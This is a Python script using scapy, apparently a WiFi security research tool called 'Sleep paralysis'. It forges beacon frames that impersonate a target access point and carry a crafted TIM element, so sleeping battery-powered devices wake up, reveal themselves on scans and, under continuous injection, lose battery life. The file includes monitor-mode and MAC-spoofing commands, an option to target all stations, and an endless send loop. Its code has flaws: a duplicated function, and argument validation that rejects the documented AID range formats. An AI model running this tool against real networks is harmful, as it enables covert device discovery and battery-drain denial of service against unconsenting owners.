# Made in Australia
#
# WARNING: This tool is for authorized security testing and research purposes only.
# Unauthorized use against networks you don't own or have permission to test may be illegal.
#
# Battery powered wifi devices sleep which can prevent them showing up on a WiFi scan
# Some devices use the TIM component of the non encrypted management frame to wake the device up, if the TIM
# shows there is data waiting for it, it will wake up sending an ACK or NULL frame and await the data
# The Beacon frame and TIM can be spoofed to force a device to wake up and respond with NULL or ACK frames causing it to show up on a scan
# If the device is continually made to respond its battery life may be adversely affected as it can no longer sleep........
#
#
# Changelog
# 0.2 - Large rewrite to improve usability
#      - needs further testing to make sure frame construction is correct
#     - Command line interface added
#     - Calculate TIM data from user input
#     - Corrections to how TIM data is constructed
# 0.1 - Proof of concept code
#
#
import argparse
import re
import sys
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump

# README.....
#
# This script will need to be run as SUDO so the packets can be injected, change the appropriate parameters at
# the bottom of this script prior to running it.
# You need to ensure your wifi adapter is in monitor mode / and is capable of supporting frame injection (sudo aireplay-ng --test wlan0)
# The MAC of your adapter needs to be changed to match the target AP or frames will be ignored by the target device
#
# sudo airmon-ng check kill
# sudo airmon-ng start wlan0
# sudo ifconfig wlan0mon down
# IMPORTANT - You need to make sure you also change the MAC oc your adapter.
# sudo macchanger -m A0:00:00:00:00:00 wlan0mon
# sudo ifconfig wlan0mon up
#
#
# Troubleshooting
# Monitor transmitted packets with Wireshark and make sure your channel and MAC settings have changed correctly
# This mismatch causes most of the issues
#
# TIM Construction guide
# 00 00 00 00 00 00
# |  |  |  |  |   \_Virtual Bitmap - Device Association ID's (AID) - This field is used to target a device
# |  |  |  |  |      Client association ID's need to be calculated or iterated to wake up clients
# |  |  |  |  |      A specific client can be targeted if you know the AID from a previous capture
# |  |  |  |  \_Bitmap Control
# |  |  |   \_DTIM Period - How long is the DTIM period
# |  |   \_DTIM Count - Count of DTIM's in period, resets when == DTIM period
# |   \_Tag length
#  \_Tag number - Traffic Indication Map flag
#
# AID Construction
#            Bitmap Control   Virtual Bitmap
#            |                |
#            |                 \ 0000 0000
#            |
#             \ 0000 0000
#               |      | \ Multicast true or false
#               |7 Bits|
#                   \ Offset control for bitmap
#
# e.g Bitmap Control 0x00 masks devices 1-8, 0x01 devices 9-16
# AID Technically starts from 0 so is device 0-7 but will be usually shown as device 1-8....
#
# Examples
#
# Control     Mask
# 0000 0000 | 0000 0001 - Device AID 0
# 0000 0000 | 0000 0100 - Device AID 2
# 0000 0000 | 0000 0110 - Device 1 and 2 (0x60)

#
# TODO automate macchanger and monitor mode setup
#

__description__ = (
    "Emits forged beacon frames to wake up sleeping devices who rely on DTIM to wake up"
)
__author__ = "facelessg00n"
__version__ = "0.2 alpha"

banner = """
 _____ _                                         _           _     
/  ___| |                                       | |         (_)    
\\ `--.| | ___  ___ _ __    _ __   __ _ _ __ __ _| |_   _ ___ _ ___ 
 `--. \\ |/ _ \\/ _ \\ '_ \\  | '_ \\ / _` | '__/ _` | | | | / __| / __|
/\\__/ / |  __/  __/ |_) | | |_) | (_| | | | (_| | | |_| \\__ \\ \\__ \\
\\____/|_|\\___|\\___| .__/  | .__/ \\__,_|_|  \\__,_|_|\\__, |___/_|___/
                  | |     | |                       __/ |          
                  |_|     |_|                      |___/           
                                                                                                                                                
 """


def tim_packet(ssid, bssid, tim_data, channel):
    dot11 = Dot11(
        type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
    )
    beacon = Dot11Beacon(cap="ESS+IBSS")
    ssid_element = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    ds_element = Dot11Elt(ID="DSset", info=chr(channel))
    tim_element = Dot11Elt(ID="TIM", info=tim_data)
    frame = RadioTap() / dot11 / beacon / ssid_element / ds_element / tim_element
    return frame


# Accepts an integer list of AIDs and returns the TIM data bytes
def calculate_tim_data(aids, dtim_count=11, dtim_period=33):
    if not aids:
        # No AIDs - return minimal TIM
        return bytes([dtim_count, dtim_period, 0, 0])

    # Find min and max AIDs to determine bitmap range
    min_aid = min(aids)
    max_aid = max(aids)

    # Calculate which byte each AID falls into
    # Byte 0 = AIDs 0-7, Byte 1 = AIDs 8-15, etc.
    min_byte = min_aid // 8
    max_byte = max_aid // 8

    # N1 must be the largest even number where all bits before it are 0
    # This means we round down to nearest even byte
    n1 = (min_byte // 2) * 2
    n2 = max_byte

    # Bitmap offset is N1/2 (bits 1-7 of Bitmap Control)
    bitmap_offset = n1 // 2

    # Multicast bit (bit 0) - set to 0 for unicast only
    multicast_bit = 0

    # Construct Bitmap Control byte
    bitmap_control = (bitmap_offset << 1) | multicast_bit

    # Create the Partial Virtual Bitmap
    # It covers bytes N1 to N2
    pvb_length = (n2 - n1) + 1
    pvb = bytearray(pvb_length)

    # Set the appropriate bits for each AID
    for aid in aids:
        # Which byte in the full virtual bitmap?
        byte_index = aid // 8
        # Which bit within that byte?
        bit_index = aid % 8
        # Which byte in our partial virtual bitmap?
        pvb_byte_index = byte_index - n1
        # Set the bit
        if 0 <= pvb_byte_index < pvb_length:
            pvb[pvb_byte_index] |= 1 << bit_index

    # Construct complete TIM data
    tim_data = bytes([dtim_count, dtim_period, bitmap_control]) + bytes(pvb)

    return tim_data


# Returns an integer list of AIDs from an input
# Accepts the following formats "1", "1-4", "0,2,5", "1-3,5,7", "28"
def parse_aid_input(aid_input):

    if aid_input is None:
        return []

    # If argparse returned an int (older behavior), normalize to list
    if isinstance(aid_input, int):
        return [aid_input]

    s = str(aid_input).strip()
    if not s:
        return []

    aids = []
    for part in s.replace(" ", "").split(","):
        if not part:
            continue
        if "-" in part:
            start, end = map(int, part.split("-"))
            aids.extend(range(start, end + 1))
        else:
            aids.append(int(part))

    return aids


# Validate input Mac address format
def validate_mac(mac):
    pattern = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$")
    if not pattern.match(mac):
        raise argparse.ArgumentTypeError(f"Invalid MAC address: {mac}")
    return mac


# Valid Wifi channel range for 2.4 GHz
def validate_channel(channel):
    channel = int(channel)
    if channel < 1 or channel > 14:
        raise argparse.ArgumentTypeError(f"Channel must be between 1 and 14: {channel}")
    return channel


# Bitmask must be between 0 and 2007 to be valid
def validate_aids(bitmask):
    try:
        value = int(bitmask)
        if value < 0 or value > 2007:
            raise argparse.ArgumentTypeError(
                f"AID must be between 0 and 2007: {bitmask}"
            )
        return value
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid AID format: {bitmask}")


# Construct the frame to be broadcast
# Type is 00 (Management), Subtype is 8 (Beacon)
def tim_packet(ssid, bssid, tim_data, channel):
    dot11 = Dot11(
        type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
    )
    beacon = Dot11Beacon(cap="ESS+IBSS")
    ssid_element = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    ds_element = Dot11Elt(ID="DSset", info=chr(channel))
    tim_element = Dot11Elt(ID="TIM", info=tim_data)
    frame = RadioTap() / dot11 / beacon / ssid_element / ds_element / tim_element
    return frame


def parse_arguments():

    parser = argparse.ArgumentParser(
        description=__description__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Wake device AID 1
  %(prog)s -b A0:00:00:00:00:00 -s NETGEAR00 -c 6 --aid 1
  
  # Wake devices AID 1-4
  %(prog)s -b A0:00:00:00:00:00 -s NETGEAR00 -c 6 --aid 1-4
  
  # Wake device AID 28
  %(prog)s -b A0:00:00:00:00:00 -s NETGEAR00 -c 6 --aid 28
  
  # Wake specific devices (AIDs 0, 28, 105)
  %(prog)s -b A0:00:00:00:00:00 -s NETGEAR00 -c 6 --aid 0,28,105
  
  # Wake ranges and specific devices
  %(prog)s -b A0:00:00:00:00:00 -s NETGEAR00 -c 6 --aid 1-10,28,50-55

How TIM Works:
  - AIDs range from 1 to 2007 (per 802.11 spec)
  - The Bitmap Control offset determines which byte range is transmitted
  - For AID 28: Bitmap Offset=1, starts from byte 2 (AIDs 16-31)

        """,
    )

    parser.add_argument(
        "-b",
        "--bssid",
        type=validate_mac,
        required=True,
        help="Target BSSID (MAC address) e.g., A0:00:00:00:00:00",
    )

    parser.add_argument(
        "-s",
        "--ssid",
        type=str,
        required=True,
        help="Target SSID (network name) e.g., NETGEAR00",
    )

    parser.add_argument(
        "-c",
        "--channel",
        type=validate_channel,
        required=True,
        help="Target WiFi channel (1-14)",
    )

    # Create mutually exclusive group for AID specification, this will allow the use of the --all flag
    aid_group = parser.add_mutually_exclusive_group(required=True)

    aid_group.add_argument(
        "--aid",
        type=validate_aids,
        help='Device AIDs to wake (1-2007). Examples: "1", "28", "1-4", "0,28,105", "1-10,50-55"',
    )

    aid_group.add_argument(
        "--all",
        action="store_true",
        help="Wake ALL stations (AIDs 0-2007). Equivalent to --aid 0-2007",
    )

    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        default="wlan0mon",
        help="WiFi monitor interface (default: wlan0mon)",
    )

    parser.add_argument(
        "-t",
        "--interval",
        type=float,
        default=0.01,
        help="Send interval in seconds (default: 0.01)",
    )

    parser.add_argument(
        "--dtim-count", type=int, default=11, help="DTIM count value (default: 11)"
    )

    parser.add_argument(
        "--dtim-period", type=int, default=33, help="DTIM period value (default: 33)"
    )

    parser.add_argument(
        "--show-packet", action="store_true", help="Show packet details before sending"
    )

    parser.add_argument(
        "-v", "--version", action="version", version=f"%(prog)s {__version__}"
    )

    return parser.parse_args()


def main():
    print(banner)
    print(f"Version: {__version__}")
    print(f"Author: {__author__}\n")

    # Parse command line arguments
    args = parse_arguments()

    if args.all:
        aids = list(range(0, 2008))  # All AIDs from 0 to 2007
        print(f"[ALL STATIONS MODE] Targeting all AIDs 0-2007 ({len(aids)} stations)\n")
    else:
        aids = parse_aid_input(args.aid)

    aids.sort()

    # Calculate TIM data
    tim_data = calculate_tim_data(aids, args.dtim_count, args.dtim_period)

    # Create forged frame
    forged_frame = tim_packet(args.ssid, args.bssid, tim_data, args.channel)

    # Display configuration
    print("Configuration:")
    print(f"  Target BSSID:      {args.bssid}")
    print(f"  Target SSID:       {args.ssid}")
    print(f"  Channel:           {args.channel}")
    print(f"  Target AIDs:       {aids}")
    print(f"  DTIM Count:        {args.dtim_count}")
    print(f"  DTIM Period:       {args.dtim_period}")
    print(f"  Interface:         {args.interface}")
    print(f"  Send Interval:     {args.interval}s")

    # Show TIM structure details
    print(f"\nTIM Structure:")
    print(f"  Bitmap Control:    {tim_data[2]} (offset: {tim_data[2] >> 1})")
    print(f"  PVB Length:        {len(tim_data) - 3} bytes")
    print(
        f"  PVB Covers AIDs:   {(tim_data[2] >> 1) * 2 * 8} - {((tim_data[2] >> 1) * 2 + len(tim_data) - 3) * 8 - 1}"
    )
    print()

    # Show packet details if requested
    if args.show_packet:
        print("Packet details:")
        forged_frame.show()
        print("\nPacket hexdump:")
        hexdump(forged_frame)
        print()

    # Confirm before sending
    try:
        response = input(f"Send packets on {args.interface}? [y/N]: ")
        if response.lower() != "y":
            print("Aborted.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)

    # Send packets
    print(f"\nSending packets every {args.interval} seconds on {args.interface}")
    print("Press Ctrl+C to stop...\n")

    try:
        sendp(forged_frame, iface=args.interface, inter=args.interval, loop=1)
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nError: {e}")
        print("\nTroubleshooting:")
        print(f"  - Run with sudo/root privileges")
        print(f"  - Ensure {args.interface} exists and is in monitor mode")
        print(f"  - Verify channel {args.channel} is valid for your region")
        sys.exit(1)


if __name__ == "__main__":
    main()
